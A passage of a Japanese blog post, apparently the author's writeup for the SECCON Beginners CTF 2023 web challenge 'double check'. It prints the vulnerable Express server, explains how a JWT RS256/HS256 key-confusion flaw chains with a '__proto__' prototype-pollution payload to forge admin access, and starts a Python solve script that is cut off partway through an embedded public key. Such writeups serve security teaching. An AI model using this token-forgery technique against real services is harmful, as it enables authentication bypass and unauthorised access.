@@ -1,0 +1,294 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SECCON Beginners CTF 2023[Web] double check, oooauth 作問者writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SECCON Beginners CTF 2023で出題したWeb問題double check、oooauthの作問者writeupです。 double check（難易度 Medium） JWTを用いた認証機能の脆弱性とPrototype Pollutionの脆弱性を連鎖的に悪用する問題です。
+問題の実装は以下です。
+const express = require(&#34;express&#34;); const session = require(&#34;express-session&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const _ = require(&#34;lodash&#34;); const { readKeyFromFile, generateRandomString, getAdminPassword } = require(&#34;./utils&#34;); const HOST = process.env.CTF4B_HOST; const PORT = process.env.CTF4B_PORT; const FLAG = process.env.CTF4B_FLAG; const app = express(); app.use(express.json()); app.use(session({ secret: generateRandomString(), resave: false, saveUninitialized: true, cookie: { secure: false } })); app.post(&#34;/register&#34;, (req, res) => { const { username, password } = req."><meta property="og:image" content><meta property="og:title" content="SECCON Beginners CTF 2023[Web] double check, oooauth 作問者writeup"><meta property="og:description" content="SECCON Beginners CTF 2023で出題したWeb問題double check、oooauthの作問者writeupです。 double check（難易度 Medium） JWTを用いた認証機能の脆弱性とPrototype Pollutionの脆弱性を連鎖的に悪用する問題です。
+問題の実装は以下です。
+const express = require(&#34;express&#34;); const session = require(&#34;express-session&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const _ = require(&#34;lodash&#34;); const { readKeyFromFile, generateRandomString, getAdminPassword } = require(&#34;./utils&#34;); const HOST = process.env.CTF4B_HOST; const PORT = process.env.CTF4B_PORT; const FLAG = process.env.CTF4B_FLAG; const app = express(); app.use(express.json()); app.use(session({ secret: generateRandomString(), resave: false, saveUninitialized: true, cookie: { secure: false } })); app.post(&#34;/register&#34;, (req, res) => { const { username, password } = req."><meta property="og:type" content="article"><meta property="og:url" content="/posts/36/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-04T14:14:37+09:00"><meta property="article:modified_time" content="2023-06-04T14:14:37+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SECCON Beginners CTF 2023[Web] double check, oooauth 作問者writeup"><meta name=twitter:description content="SECCON Beginners CTF 2023で出題したWeb問題double check、oooauthの作問者writeupです。 double check（難易度 Medium） JWTを用いた認証機能の脆弱性とPrototype Pollutionの脆弱性を連鎖的に悪用する問題です。
+問題の実装は以下です。
+const express = require(&#34;express&#34;); const session = require(&#34;express-session&#34;); const jwt = require(&#34;jsonwebtoken&#34;); const _ = require(&#34;lodash&#34;); const { readKeyFromFile, generateRandomString, getAdminPassword } = require(&#34;./utils&#34;); const HOST = process.env.CTF4B_HOST; const PORT = process.env.CTF4B_PORT; const FLAG = process.env.CTF4B_FLAG; const app = express(); app.use(express.json()); app.use(session({ secret: generateRandomString(), resave: false, saveUninitialized: true, cookie: { secure: false } })); app.post(&#34;/register&#34;, (req, res) => { const { username, password } = req."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>SECCON Beginners CTF 2023[Web] double check, oooauth 作問者writeup</h1><div class=meta>Posted on Jun 4, 2023</div></div><nav id=TableOfContents><ol><li><a href=#double-check難易度-medium>double check（難易度 Medium）</a></li><li><a href=#oooauth難易度-hard>oooauth（難易度 Hard）</a></li></ol></nav><section class=body><p>SECCON Beginners CTF 2023で出題したWeb問題double check、oooauthの作問者writeupです。
+<img src=/images/posts/36/problems.png alt=problems></p><h1 id=double-check難易度-medium>double check（難易度 Medium）</h1><p>JWTを用いた認証機能の脆弱性とPrototype Pollutionの脆弱性を連鎖的に悪用する問題です。</p><p>問題の実装は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>session</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;express-session&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jwt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;jsonwebtoken&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>_</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;lodash&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>readKeyFromFile</span>, <span style=color:#a6e22e>generateRandomString</span>, <span style=color:#a6e22e>getAdminPassword</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;./utils&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>HOST</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CTF4B_HOST</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CTF4B_PORT</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CTF4B_FLAG</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>json</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>session</span>({
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>secret</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>generateRandomString</span>(),
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>resave</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>saveUninitialized</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cookie</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>secure</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }
+</span></span><span style=display:flex><span>}));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/register&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>password</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Please send username and password&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>username</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>password</span>
+</span></span><span style=display:flex><span>  };
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>getAdminPassword</span>()) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>admin</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>user</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>signed</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>signed</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>(
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>_</span>.<span style=color:#a6e22e>omit</span>(<span style=color:#a6e22e>user</span>, [<span style=color:#e6db74>&#34;password&#34;</span>]),
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>readKeyFromFile</span>(<span style=color:#e6db74>&#34;keys/private.key&#34;</span>), 
+</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithm</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;RS256&#34;</span>, <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;1h&#34;</span> } 
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Internal server error&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>, <span style=color:#a6e22e>signed</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;ok&#34;</span> });
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;No JWT Token&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;No User Found&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>verified</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>),
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>readKeyFromFile</span>(<span style=color:#e6db74>&#34;keys/public.key&#34;</span>), 
+</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;RS256&#34;</span>, <span style=color:#e6db74>&#34;HS256&#34;</span>] }
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#a6e22e>err</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid Token&#34;</span> });
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>getAdminPassword</span>()) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>_</span>.<span style=color:#a6e22e>omit</span>(<span style=color:#a6e22e>verified</span>, [<span style=color:#e6db74>&#34;admin&#34;</span>]);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> Object.<span style=color:#a6e22e>assign</span>({}, <span style=color:#a6e22e>verified</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> Object.<span style=color:#a6e22e>assign</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>, <span style=color:#a6e22e>verified</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>admin</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>admin</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Congratulations! Here&#34;s your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;No flag for you&#34;</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>PORT</span>, <span style=color:#a6e22e>HOST</span>, () =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server is running on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>PORT</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>以下2つのエンドポイントが存在します。</p><ul><li>ユーザーを登録するためのエンドポイント（<code>/register</code>）<ul><li><code>username</code>と<code>password</code>を受け取って、ユーザーオブジェクトをセッションに保存します。</li><li>ユーザーオブジェクトをpayloadとするJWTを発行し、レスポンスの<code>Authorization</code>ヘッダにセットします。</li></ul></li><li>flagを取得するためのエンドポイント（<code>/flag</code>）<ul><li><code>Authorization</code>ヘッダにセットされたJWTを受け取って検証します。</li><li><code>token.admin</code>と<code>user.admin</code>が両方とも<code>true</code>となる場合にflagを返します。</li></ul></li></ul><p>通常はJWTの署名アルゴリズムとしてRS256が使用され、秘密鍵を用いて署名がなされます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>signed</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>(
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_</span>.<span style=color:#a6e22e>omit</span>(<span style=color:#a6e22e>user</span>, [<span style=color:#e6db74>&#39;password&#39;</span>]),
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>readKeyFromFile</span>(<span style=color:#e6db74>&#39;keys/private.key&#39;</span>), 
+</span></span><span style=display:flex><span>    { <span style=color:#a6e22e>algorithm</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;RS256&#39;</span>, <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;1h&#39;</span> } 
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>JWTの署名検証部分では、RS256の他にHS256を使用することが可能となっています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Authorization&#39;</span>),
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>readKeyFromFile</span>(<span style=color:#e6db74>&#39;keys/public.key&#39;</span>), 
+</span></span><span style=display:flex><span>    { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#39;RS256&#39;</span>, <span style=color:#e6db74>&#39;HS256&#39;</span>]
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>ここでは、RS256の公開鍵をHS256の共通鍵として使用する攻撃が可能となります。署名アルゴリズムをHS256に設定したJWTに、配布ファイルから得た公開鍵を用いた署名を付与することで署名の検証をパスできます（<a href=https://scgajge12.hatenablog.com/entry/jwt_security>参考</a>）。これにより、JWTのpayloadを改ざんすることが可能となりました。</p><p>ここでJWTのpayloadに<code>admin: true</code>を含めることを考えますが、<code>admin</code>でない場合はJWTのpayloadの<code>admin</code>パラメータが削除されるため、この攻撃は防がれてしまいます。そこで、以下の部分に着目します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>getAdminPassword</span>()) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>_</span>.<span style=color:#a6e22e>omit</span>(<span style=color:#a6e22e>verified</span>, [<span style=color:#e6db74>&#39;admin&#39;</span>]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> Object.<span style=color:#a6e22e>assign</span>({}, <span style=color:#a6e22e>verified</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> Object.<span style=color:#a6e22e>assign</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>user</span>, <span style=color:#a6e22e>verified</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>admin</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>admin</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Congratulations! Here&#39;s your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>ここでは<a href=https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/assign><code>Object.assign()</code></a>が使用され、<code>verified</code>の全てのプロパティの値を空のオブジェクトと<code>req.session.user</code>にコピーし、それぞれが<code>token</code>と<code>user</code>の2つの変数に格納されます。</p><p>ここで、jwtのpayloadに<code>__proto__.admin: true</code>を加えることで<code>token.admin && user.admin</code>の検証をパスできます。これは、jwtのpayloadが<code>JSON.parse()</code>によってJSON文字列からJavascriptのオブジェクトに<a href=https://github.com/auth0/node-jsonwebtoken/blob/a99fd4b473e257c2f50ff69c716db1c520bf9a78/decode.js#L12>変換され</a>、<code>Object.assign()</code>により<code>__proto__</code>を介して<code>admin</code>パラメータが<code>verified</code>にコピーされることに起因します（<a href=https://www.fastify.io/docs/latest/Guides/Prototype-Poisoning/>参考</a>）。</p><pre tabindex=0><code>&gt; const jwt_payload = &#39;{&#34;__proto__&#34;: { &#34;admin&#34;: true }}&#39;;
+&gt; const verified = JSON.parse(jwt_payload);
+&gt; verified
+{ [&#39;__proto__&#39;]: { admin: true } }
+&gt; const token = Object.assign({}, verified);
+&gt; token.admin
+true
+</code></pre><p>最終的に以下のPythonスクリプトを用いてflagを取得することができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> textwrap
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>(url):
+</span></span><span style=display:flex><span>    <span style=color:#75715e># /register</span>
+</span></span><span style=display:flex><span>    register_data <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;alice&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;password&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    register_response <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/register&#39;</span>, json<span style=color:#f92672>=</span>register_data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> register_response<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Register request failed: </span><span style=color:#e6db74>{</span>register_response<span style=color:#f92672>.</span>status_code<span style=color:#e6db74>}</span><span style=color:#e6db74>, </span><span style=color:#e6db74>{</span>register_response<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># /flag</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;__proto__&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;admin&#34;</span>: <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    pubkey <span style=color:#f92672>=</span> textwrap<span style=color:#f92672>.</span>dedent(<span style=color:#e6db74>&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3NcjHBbKAAhJd6P+TviV
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>h/WRXtxtKBJLPQYIlmZ/I35WlQLpNXR9Q0YiQLMNW0E3MTHISQlQE5hBF8S2Z2tC
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>0SmiAMr3QQjaIA3vmefA/CXSp4YjIbKz75Nwzczk7spYiVwEbYoLOpovnl+KB6Tj
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>XJWCFXvgpL6xYu9Se8msgqVIl+cWANlmPdBuDRvF/7KUboHsdZsn1mL88JoTnk9u
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>sVp9PP+bpbcFEzwzfS+YkjwUhXFHHNPqsu9eKZZlpkRbl3lZzzxgX4G/bh3BkaCO
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>wp4Pv1ptk8NJH8N96USDw3Lpgc6wGReoyCBY7Dtg1a3IHNjQQwQg+rd+1yUUfPAe
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qa9MbLWr3hYQn+9G4SxTwmWptGJLLjZMzfELtGxiZTHlnifP4nHSNJ8WdGJ63YU9
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>7LiwkWsE8BVIPi+f/oNIbhhgJzGSD57mkdN0wNloN0I+83/0g2TnVSvkSM5ow/E9
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>h2w/qaT9LfjtYiZbFFc95lwcaR1nUO/hmZ2okTt7Nh5tlefbvHNSyHMFuvTiEanI
